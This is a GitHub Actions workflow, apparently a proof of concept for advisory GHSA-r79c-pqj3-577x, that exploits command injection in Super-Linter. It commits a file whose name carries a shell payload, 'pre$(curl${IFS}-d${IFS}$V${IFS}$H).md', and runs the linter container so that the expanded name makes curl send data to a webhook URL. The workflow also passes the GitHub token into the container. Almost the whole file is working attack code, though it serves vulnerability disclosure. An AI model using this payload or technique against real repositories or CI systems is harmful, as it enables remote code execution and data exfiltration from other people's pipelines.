name: Security Repro - GHSA-r79c-pqj3-577x

on:
  workflow_dispatch:
    inputs:
      target_version:
        description: 'Target version'
        required: true
        default: 'v7'
      webhook_url:
        description: 'Webhook URL'
        required: true
        default: 'https://webhook.site/YOUR-UUID-HERE'

jobs:
  repro-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: 1. Setup Git & Payload
        run: |
          # --- Environment Setup ---
          # We need to simulate a fresh Git environment to manually control the history.
          # This allows us to create a specific "diff" that Super-Linter will analyze.
          rm -rf .git
          git init
          git config --global user.email "attacker@example.com"
          git config --global user.name "Attacker"
          
          # 1. Create a "safe" baseline branch (master)
          echo "safe" > README.md
          git add README.md
          git commit -m "init"
          git branch -m master
          
          # [CRITICAL] Capture the baseline SHA.
          # We will pass this to the container to force a diff against this commit.
          echo "MASTER_SHA=$(git rev-parse HEAD)" >> $GITHUB_ENV
          
          # 2. Construct the Malicious Payload
          # Technical Challenge: 
          #   - Filenames cannot contain slashes `/` (Linux restriction).
          #   - Filenames with spaces might break argument parsing in `parallel`.
          # Solution: 
          #   - We use environment variables ($H for URL, $V for Data) to inject content.
          #   - We use ${IFS} instead of spaces to ensure the command is parsed correctly by the shell.
          # Resulting Command: curl -d $V $H
          PAYLOAD_NAME='pre$(curl${IFS}-d${IFS}$V${IFS}$H).md'
          
          echo "Creating malicious file: $PAYLOAD_NAME"
          touch "$PAYLOAD_NAME"
          
          # 3. Commit the Payload
          # [CRITICAL] The file MUST be committed. 
          # Super-Linter's `GenerateFileDiff` (or `git ls-tree`) ignores untracked files.
          # If we only `touch` the file without committing, the linter will see an empty file list.
          git add "$PAYLOAD_NAME"
          git commit -m "add exploit"
          
          # [CRITICAL] Capture the current SHA to mark the end of the diff range.
          echo "CURRENT_SHA=$(git rev-parse HEAD)" >> $GITHUB_ENV

      - name: 2. Run Super-Linter (Force Diff)
        continue-on-error: true
        run: |
          echo "Testing version: ${{ inputs.target_version }}"
          echo "Diff Range: ${{ env.MASTER_SHA }} ... ${{ env.CURRENT_SHA }}"
          
          # Prepare the data payload (Version info) to be passed via env var $V
          DATA_STRING="version=${{ inputs.target_version }}"
          
          # Launch the container in Local Mode
          # We explicitly pass:
          #   - VALIDATE_ALL_CODEBASE=false: Forces the "git diff" logic path (where the vulnerability lies).
          #   - GITHUB_BEFORE_SHA / GITHUB_SHA: Manually defines the diff range to ensure our malicious file is included.
          #   - H & V: The environment variables required for the filename expansion.
          
          docker run --rm \
            -e RUN_LOCAL=true \
            -e VALIDATE_ALL_CODEBASE=false \
            -e DEFAULT_BRANCH=master \
            -e GITHUB_BEFORE_SHA=${{ env.MASTER_SHA }} \
            -e GITHUB_SHA=${{ env.CURRENT_SHA }} \
            -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
            -e H="${{ inputs.webhook_url }}" \
            -e V="$DATA_STRING" \
            -v "$(pwd):/tmp/lint" \
            ghcr.io/super-linter/super-linter:${{ inputs.target_version }}
            
      - name: 3. Verify
        run: |
          echo "Exploit run complete."
          echo "Please check ${{ inputs.webhook_url }} for the incoming request."
